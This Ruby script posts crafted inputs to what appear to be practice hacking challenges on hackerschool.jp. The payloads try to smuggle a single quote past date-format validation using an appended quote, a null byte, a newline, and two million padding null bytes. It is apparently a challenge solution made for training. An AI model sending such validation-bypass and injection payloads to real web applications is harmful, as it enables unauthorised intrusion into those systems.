#!/usr/bin/ruby
require 'net/http'
require 'cgi'
require 'json'
class String
	def escape() CGI.escape(self) end
end
=begin
uri=URI.parse('http://www.hackerschool.jp/hack/take56_1.php')
Net::HTTP.start(uri.host){|http|
	p JSON.parse(http.post(uri.path,'attack_value='+"00-00-0000'".escape).body)
}
uri=URI.parse('http://www.hackerschool.jp/hack/take56_2.php')
Net::HTTP.start(uri.host){|http|
	p JSON.parse(http.post(uri.path,'attack_value='+"00-00-0000%00'".escape).body)
}
uri=URI.parse('http://www.hackerschool.jp/hack/take56_3.php')
Net::HTTP.start(uri.host){|http|
	p JSON.parse(http.post(uri.path,'attack_value='+"1-1-1%0a'".escape).body)
}
=end
uri=URI.parse('http://www.hackerschool.jp/hack/take56_4.php')
Net::HTTP.start(uri.host){|http|
	p JSON.parse(http.post(uri.path,'attack_value='+('%00'*1000000+"'"+'%00'*1000000).escape).body)
}